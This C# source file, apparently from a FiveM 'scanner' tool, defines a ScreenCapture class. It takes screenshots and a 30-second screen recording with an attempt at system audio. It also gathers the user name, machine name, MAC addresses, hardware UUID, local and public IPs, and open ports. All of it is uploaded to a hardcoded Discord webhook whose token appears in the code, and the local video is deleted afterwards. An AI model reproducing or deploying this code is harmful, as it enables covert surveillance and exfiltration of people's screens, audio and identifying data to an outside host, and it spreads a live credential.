using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace FiveMScanner
{
    public class ScreenCapture
    {
        private const string WEBHOOK_URL = "https://discord.com/api/webhooks/1436498217045856378/yOPWiBiiHbbDn_Y3FUoXWA4ZKxXbVen7sMRDscFzCeVM6Dwo1vn0RZJDcn7UU4hHqIrh";
        private bool _isRecording = false;
        private CancellationTokenSource? _cancellationTokenSource;
        private SystemStats? _initialStats;

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSource, int xSrc, int ySrc, int RasterOp);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr hObject);

        private const int SRCCOPY = 0x00CC0020;

        public async Task StartRecording(int durationSeconds = 30)
        {
            if (_isRecording) return;

            _isRecording = true;
            _cancellationTokenSource = new CancellationTokenSource();

            try
            {
                // Collect initial system stats
                _initialStats = await CollectSystemStats();
                
                // Send initial stats
                await SendSystemStatsToDiscord(_initialStats, "🟢 Scan Started");
                
                // Take 1 screenshot
                await TakeAndSendScreenshot("Initial Screenshot");

                // Start video recording for 30 seconds
                Console.WriteLine("🎥 Starting video recording...");
                var videoPath = await RecordVideo(durationSeconds);

                // Send video to Discord
                if (!string.IsNullOrEmpty(videoPath) && File.Exists(videoPath))
                {
                    await SendVideoToDiscord(videoPath, "30 Second Screen Recording");
                    
                    // Delete temp video file
                    try { File.Delete(videoPath); } catch { }
                }

                // Send final stats
                var finalStats = await CollectSystemStats();
                await SendSystemStatsToDiscord(finalStats, "🔴 Scan Completed");
            }
            catch (OperationCanceledException)
            {
                // Recording was cancelled
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️  Error during recording: {ex.Message}");
            }
            finally
            {
                _isRecording = false;
            }
        }

        public void StopRecording()
        {
            _cancellationTokenSource?.Cancel();
        }

        private async Task TakeAndSendScreenshot(string caption)
        {
            try
            {
                var screenshot = CaptureScreen();
                if (screenshot != null)
                {
                    await SendToDiscord(screenshot, caption);
                    screenshot.Dispose();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️  Error taking screenshot: {ex.Message}");
            }
        }

        private Bitmap? CaptureScreen()
        {
            try
            {
                var screenBounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                var bitmap = new Bitmap(screenBounds.Width, screenBounds.Height, PixelFormat.Format32bppArgb);

                using (var graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(screenBounds.X, screenBounds.Y, 0, 0, screenBounds.Size, CopyPixelOperation.SourceCopy);
                }

                return bitmap;
            }
            catch
            {
                return null;
            }
        }

        private async Task SendToDiscord(Bitmap screenshot, string caption)
        {
            try
            {
                using (var httpClient = new HttpClient())
                using (var memoryStream = new MemoryStream())
                {
                    screenshot.Save(memoryStream, ImageFormat.Jpeg);
                    memoryStream.Position = 0;

                    using (var content = new MultipartFormDataContent())
                    {
                        var imageContent = new ByteArrayContent(memoryStream.ToArray());
                        imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
                        content.Add(imageContent, "file", $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.jpg");

                        var embed = new
                        {
                            content = $"**{caption}**\n📅 {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n💻 {Environment.MachineName}\n👤 {Environment.UserName}"
                        };

                        var jsonContent = new StringContent(
                            JsonConvert.SerializeObject(embed),
                            Encoding.UTF8,
                            "application/json"
                        );
                        content.Add(jsonContent, "payload_json");

                        var response = await httpClient.PostAsync(WEBHOOK_URL, content);
                        
                        if (!response.IsSuccessStatusCode)
                        {
                            Console.WriteLine($"⚠️  Failed to send screenshot: {response.StatusCode}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️  Error sending to Discord: {ex.Message}");
            }
        }

        private async Task<SystemStats> CollectSystemStats()
        {
            var stats = new SystemStats
            {
                Timestamp = DateTime.Now,
                MachineName = Environment.MachineName,
                UserName = Environment.UserName,
                OSVersion = Environment.OSVersion.ToString(),
                ProcessorCount = Environment.ProcessorCount
            };

            try
            {
                // CPU Usage
                using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
                {
                    cpuCounter.NextValue();
                    await Task.Delay(100);
                    stats.CpuUsage = Math.Round(cpuCounter.NextValue(), 2);
                }

                // RAM Usage
                using (var ramCounter = new PerformanceCounter("Memory", "Available MBytes"))
                {
                    var availableRAM = ramCounter.NextValue();
                    var totalRAM = GetTotalPhysicalMemory();
                    stats.RamUsedMB = totalRAM - (long)availableRAM;
                    stats.RamTotalMB = totalRAM;
                    stats.RamUsagePercent = Math.Round((stats.RamUsedMB / (double)stats.RamTotalMB) * 100, 2);
                }

                // MAC Address
                stats.MacAddresses = GetMacAddresses();

                // UUID (Machine GUID)
                stats.MachineGuid = GetMachineGuid();

                // IP Addresses
                stats.IpAddresses = await GetIpAddresses();

                // Open Ports
                stats.OpenPorts = GetOpenPorts();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️  Error collecting stats: {ex.Message}");
            }

            return stats;
        }

        private long GetTotalPhysicalMemory()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        return Convert.ToInt64(obj["TotalVisibleMemorySize"]) / 1024; // Convert KB to MB
                    }
                }
            }
            catch { }
            return 0;
        }

        private List<string> GetMacAddresses()
        {
            var macAddresses = new List<string>();
            try
            {
                foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.OperationalStatus == OperationalStatus.Up && 
                        nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        var mac = nic.GetPhysicalAddress().ToString();
                        if (!string.IsNullOrEmpty(mac) && mac != "000000000000")
                        {
                            macAddresses.Add(FormatMacAddress(mac));
                        }
                    }
                }
            }
            catch { }
            return macAddresses;
        }

        private string FormatMacAddress(string mac)
        {
            return string.Join(":", Enumerable.Range(0, mac.Length / 2)
                .Select(i => mac.Substring(i * 2, 2)));
        }

        private string GetMachineGuid()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT UUID FROM Win32_ComputerSystemProduct"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        return obj["UUID"]?.ToString() ?? "Unknown";
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private async Task<List<string>> GetIpAddresses()
        {
            var ipAddresses = new List<string>();
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        ipAddresses.Add(ip.ToString());
                    }
                }

                // Get public IP
                try
                {
                    using (var client = new HttpClient())
                    {
                        client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
                        var publicIp = (await client.GetStringAsync("https://api.ipify.org")).Trim();
                        if (!string.IsNullOrEmpty(publicIp))
                        {
                            ipAddresses.Add($"{publicIp} (Public)");
                        }
                    }
                }
                catch { }
            }
            catch { }
            return ipAddresses;
        }

        private List<int> GetOpenPorts()
        {
            var openPorts = new List<int>();
            try
            {
                var properties = IPGlobalProperties.GetIPGlobalProperties();
                
                // TCP Listeners
                var tcpListeners = properties.GetActiveTcpListeners();
                foreach (var endpoint in tcpListeners)
                {
                    if (!openPorts.Contains(endpoint.Port))
                    {
                        openPorts.Add(endpoint.Port);
                    }
                }

                // UDP Listeners
                var udpListeners = properties.GetActiveUdpListeners();
                foreach (var endpoint in udpListeners)
                {
                    if (!openPorts.Contains(endpoint.Port))
                    {
                        openPorts.Add(endpoint.Port);
                    }
                }

                openPorts.Sort();
            }
            catch { }
            return openPorts.Take(50).ToList(); // Limit to first 50 ports
        }

        private async Task<string> RecordVideo(int durationSeconds)
        {
            var outputPath = Path.Combine(Path.GetTempPath(), $"recording_{DateTime.Now:yyyyMMdd_HHmmss}.mp4");
            
            try
            {
                var screenBounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                var frames = new List<Bitmap>();
                
                // Better quality settings - target ~2MB with audio
                var fps = 10; // Better FPS for smoother video (10 frames per second)
                var scale = 0.6; // Better resolution (60% of original)
                var quality = 75; // Better JPEG quality
                
                var totalFrames = durationSeconds * fps;
                var frameDelay = 1000 / fps;

                Console.WriteLine($"🎬 Recording {totalFrames} frames at {fps} FPS (scaled {scale * 100}%)...");

                // Capture frames
                for (int i = 0; i < totalFrames && !_cancellationTokenSource.Token.IsCancellationRequested; i++)
                {
                    var frame = CaptureScreen();
                    if (frame != null)
                    {
                        // Scale down the frame to reduce file size
                        var scaledFrame = ScaleImage(frame, scale);
                        frames.Add(scaledFrame);
                        frame.Dispose();
                    }
                    
                    if (i % (fps * 5) == 0) // Progress every 5 seconds
                    {
                        Console.WriteLine($"📹 Recording... {i / fps}s / {durationSeconds}s");
                    }
                    
                    await Task.Delay(frameDelay, _cancellationTokenSource.Token);
                }

                Console.WriteLine($"💾 Encoding video with {frames.Count} frames...");

                // Save frames as video
                if (frames.Count > 0)
                {
                    await SaveFramesAsVideo(frames, outputPath, fps, quality, durationSeconds);
                }

                // Cleanup frames
                foreach (var frame in frames)
                {
                    frame.Dispose();
                }

                // Check file size
                if (File.Exists(outputPath))
                {
                    var fileSize = new FileInfo(outputPath).Length;
                    Console.WriteLine($"✅ Video saved: {outputPath} ({fileSize / 1024 / 1024:F2}MB)");
                }
                
                return outputPath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️  Error recording video: {ex.Message}");
                return string.Empty;
            }
        }

        private Bitmap ScaleImage(Bitmap image, double scale)
        {
            var newWidth = (int)(image.Width * scale);
            var newHeight = (int)(image.Height * scale);
            
            var scaledImage = new Bitmap(newWidth, newHeight);
            using (var graphics = Graphics.FromImage(scaledImage))
            {
                graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                graphics.DrawImage(image, 0, 0, newWidth, newHeight);
            }
            
            return scaledImage;
        }

        private async Task SaveFramesAsVideo(List<Bitmap> frames, string outputPath, int fps, int quality, int durationSeconds)
        {
            try
            {
                // Create a simple image sequence and convert to video
                var tempDir = Path.Combine(Path.GetTempPath(), $"frames_{DateTime.Now:yyyyMMdd_HHmmss}");
                Directory.CreateDirectory(tempDir);

                // Save frames as compressed JPEG images
                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)quality);
                var jpegCodec = GetEncoder(ImageFormat.Jpeg);

                for (int i = 0; i < frames.Count; i++)
                {
                    var framePath = Path.Combine(tempDir, $"frame_{i:D5}.jpg");
                    frames[i].Save(framePath, jpegCodec, encoderParams);
                }

                // Use FFmpeg if available, otherwise create a simple GIF
                var ffmpegPath = FindFFmpeg();
                if (!string.IsNullOrEmpty(ffmpegPath))
                {
                    // Use FFmpeg with better quality and audio capture
                    // Target ~2MB file size with audio
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = ffmpegPath,
                        Arguments = $"-f dshow -i audio=\"Stereo Mix\" -framerate {fps} -i \"{tempDir}\\frame_%05d.jpg\" -c:v libx264 -crf 23 -preset medium -c:a aac -b:a 64k -pix_fmt yuv420p -movflags +faststart -t {durationSeconds} \"{outputPath}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };

                    using (var process = Process.Start(startInfo))
                    {
                        await process.WaitForExitAsync();
                    }

                    // If audio capture failed, try without audio
                    if (!File.Exists(outputPath) || new FileInfo(outputPath).Length == 0)
                    {
                        Console.WriteLine("⚠️  Audio capture failed, recording without audio...");
                        
                        var noAudioInfo = new ProcessStartInfo
                        {
                            FileName = ffmpegPath,
                            Arguments = $"-framerate {fps} -i \"{tempDir}\\frame_%05d.jpg\" -c:v libx264 -crf 23 -preset medium -pix_fmt yuv420p -movflags +faststart \"{outputPath}\"",
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true
                        };

                        using (var process = Process.Start(noAudioInfo))
                        {
                            await process.WaitForExitAsync();
                        }
                    }

                    // Check if file is too large and re-encode with higher compression
                    if (File.Exists(outputPath))
                    {
                        var fileSize = new FileInfo(outputPath).Length;
                        var maxSize = 24 * 1024 * 1024; // 24MB Discord limit
                        
                        if (fileSize > maxSize)
                        {
                            Console.WriteLine($"⚠️  Video too large ({fileSize / 1024 / 1024:F2}MB), re-encoding...");
                            var tempOutput = outputPath + ".temp.mp4";
                            
                            var reencodeInfo = new ProcessStartInfo
                            {
                                FileName = ffmpegPath,
                                Arguments = $"-i \"{outputPath}\" -c:v libx264 -crf 28 -preset fast -c:a aac -b:a 48k -pix_fmt yuv420p -movflags +faststart \"{tempOutput}\"",
                                UseShellExecute = false,
                                CreateNoWindow = true,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true
                            };

                            using (var process = Process.Start(reencodeInfo))
                            {
                                await process.WaitForExitAsync();
                            }

                            if (File.Exists(tempOutput))
                            {
                                File.Delete(outputPath);
                                File.Move(tempOutput, outputPath);
                            }
                        }
                    }
                }
                else
                {
                    // Fallback: Create optimized GIF
                    Console.WriteLine("⚠️  FFmpeg not found, creating optimized GIF instead...");
                    outputPath = outputPath.Replace(".mp4", ".gif");
                    await CreateOptimizedGif(frames, outputPath, fps);
                }

                // Cleanup temp directory
                try { Directory.Delete(tempDir, true); } catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️  Error saving video: {ex.Message}");
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            var codecs = ImageCodecInfo.GetImageDecoders();
            foreach (var codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        private string FindFFmpeg()
        {
            // Check common FFmpeg locations
            var possiblePaths = new[]
            {
                "ffmpeg.exe",
                @"C:\ffmpeg\bin\ffmpeg.exe",
                @"C:\Program Files\ffmpeg\bin\ffmpeg.exe",
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "ffmpeg", "bin", "ffmpeg.exe")
            };

            foreach (var path in possiblePaths)
            {
                if (File.Exists(path))
                    return path;
            }

            // Try to find in PATH
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "where",
                    Arguments = "ffmpeg",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true
                };

                using (var process = Process.Start(startInfo))
                {
                    var output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    if (!string.IsNullOrWhiteSpace(output))
                    {
                        var lines = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                        if (lines.Length > 0 && File.Exists(lines[0]))
                            return lines[0];
                    }
                }
            }
            catch { }

            return string.Empty;
        }

        private async Task CreateOptimizedGif(List<Bitmap> frames, string outputPath, int fps)
        {
            // Use FFmpeg to create optimized GIF if available
            var ffmpegPath = FindFFmpeg();
            if (!string.IsNullOrEmpty(ffmpegPath))
            {
                var tempDir = Path.Combine(Path.GetTempPath(), $"gif_frames_{DateTime.Now:yyyyMMdd_HHmmss}");
                Directory.CreateDirectory(tempDir);

                // Save frames
                for (int i = 0; i < frames.Count; i++)
                {
                    var framePath = Path.Combine(tempDir, $"frame_{i:D5}.png");
                    frames[i].Save(framePath, ImageFormat.Png);
                }

                // Create optimized GIF with FFmpeg
                var startInfo = new ProcessStartInfo
                {
                    FileName = ffmpegPath,
                    Arguments = $"-framerate {fps} -i \"{tempDir}\\frame_%05d.png\" -vf \"fps={fps},scale=640:-1:flags=lanczos,split[s0][s1];[s0]palettegen[p];[s1][p]paletteuse\" -loop 0 \"{outputPath}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (var process = Process.Start(startInfo))
                {
                    await process.WaitForExitAsync();
                }

                // Cleanup
                try { Directory.Delete(tempDir, true); } catch { }
            }
            else
            {
                // Simple fallback: save first frame only as static image
                Console.WriteLine("⚠️  Cannot create GIF without FFmpeg, saving first frame only...");
                outputPath = outputPath.Replace(".gif", ".jpg");
                frames[0].Save(outputPath, ImageFormat.Jpeg);
            }
            
            Console.WriteLine($"✅ Created optimized output with {frames.Count} frames");
        }

        private async Task SendVideoToDiscord(string videoPath, string caption)
        {
            try
            {
                if (!File.Exists(videoPath))
                {
                    Console.WriteLine("⚠️  Video file not found!");
                    return;
                }

                var fileInfo = new FileInfo(videoPath);
                var maxSize = 24 * 1024 * 1024; // 24MB Discord limit (safe margin under 25MB)

                if (fileInfo.Length > maxSize)
                {
                    Console.WriteLine($"⚠️  Video too large ({fileInfo.Length / 1024 / 1024:F2}MB > 24MB), cannot upload to Discord.");
                    Console.WriteLine("💡 Consider using FFmpeg with higher compression or reducing recording duration.");
                    return;
                }

                using (var httpClient = new HttpClient())
                {
                    httpClient.Timeout = TimeSpan.FromMinutes(5);
                    
                    using (var content = new MultipartFormDataContent())
                    {
                        var fileContent = new ByteArrayContent(File.ReadAllBytes(videoPath));
                        var extension = Path.GetExtension(videoPath).ToLower();
                        
                        string mimeType;
                        if (extension == ".gif")
                            mimeType = "image/gif";
                        else if (extension == ".mp4")
                            mimeType = "video/mp4";
                        else if (extension == ".jpg" || extension == ".jpeg")
                            mimeType = "image/jpeg";
                        else
                            mimeType = "application/octet-stream";
                        
                        fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue(mimeType);
                        content.Add(fileContent, "file", Path.GetFileName(videoPath));

                        var embed = new
                        {
                            content = $"**{caption}**\n📅 {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n💻 {Environment.MachineName}\n👤 {Environment.UserName}\n📦 Size: {fileInfo.Length / 1024 / 1024:F2}MB"
                        };

                        var jsonContent = new StringContent(
                            JsonConvert.SerializeObject(embed),
                            Encoding.UTF8,
                            "application/json"
                        );
                        content.Add(jsonContent, "payload_json");

                        Console.WriteLine($"📤 Uploading {extension} to Discord ({fileInfo.Length / 1024 / 1024:F2}MB)...");
                        var response = await httpClient.PostAsync(WEBHOOK_URL, content);
                        
                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("✅ Video uploaded successfully!");
                        }
                        else
                        {
                            var errorContent = await response.Content.ReadAsStringAsync();
                            Console.WriteLine($"⚠️  Failed to send video: {response.StatusCode}");
                            Console.WriteLine($"Error: {errorContent}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️  Error sending video to Discord: {ex.Message}");
            }
        }

        private async Task SendSystemStatsToDiscord(SystemStats stats, string title)
        {
            try
            {
                using (var httpClient = new HttpClient())
                {
                    var embed = new
                    {
                        embeds = new[]
                        {
                            new
                            {
                                title = title,
                                color = title.Contains("Started") ? 0x00FF00 : 0xFF0000,
                                fields = new[]
                                {
                                    new { name = "🖥️ Machine", value = $"```{stats.MachineName}```", inline = true },
                                    new { name = "👤 User", value = $"```{stats.UserName}```", inline = true },
                                    new { name = "⏰ Time", value = $"```{stats.Timestamp:HH:mm:ss}```", inline = true },
                                    new { name = "💻 OS", value = $"```{stats.OSVersion}```", inline = false },
                                    new { name = "🔥 CPU Usage", value = $"```{stats.CpuUsage}% ({stats.ProcessorCount} cores)```", inline = true },
                                    new { name = "🧠 RAM Usage", value = $"```{stats.RamUsedMB} MB / {stats.RamTotalMB} MB ({stats.RamUsagePercent}%)```", inline = true },
                                    new { name = "🆔 UUID", value = $"```{stats.MachineGuid}```", inline = false },
                                    new { name = "🌐 IP Addresses", value = $"```{string.Join("\n", stats.IpAddresses)}```", inline = false },
                                    new { name = "📡 MAC Addresses", value = $"```{string.Join("\n", stats.MacAddresses)}```", inline = false },
                                    new { name = "🔌 Open Ports", value = $"```{string.Join(", ", stats.OpenPorts.Take(30))}```", inline = false }
                                },
                                timestamp = stats.Timestamp.ToString("o")
                            }
                        }
                    };

                    var json = JsonConvert.SerializeObject(embed);
                    var content = new StringContent(json, Encoding.UTF8, "application/json");
                    
                    var response = await httpClient.PostAsync(WEBHOOK_URL, content);
                    
                    if (!response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"⚠️  Failed to send stats: {response.StatusCode}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"⚠️  Error sending stats to Discord: {ex.Message}");
            }
        }
    }

    public class SystemStats
    {
        public DateTime Timestamp { get; set; }
        public string MachineName { get; set; } = "";
        public string UserName { get; set; } = "";
        public string OSVersion { get; set; } = "";
        public int ProcessorCount { get; set; }
        public double CpuUsage { get; set; }
        public long RamUsedMB { get; set; }
        public long RamTotalMB { get; set; }
        public double RamUsagePercent { get; set; }
        public List<string> MacAddresses { get; set; } = new List<string>();
        public string MachineGuid { get; set; } = "";
        public List<string> IpAddresses { get; set; } = new List<string>();
        public List<int> OpenPorts { get; set; } = new List<int>();
    }
}
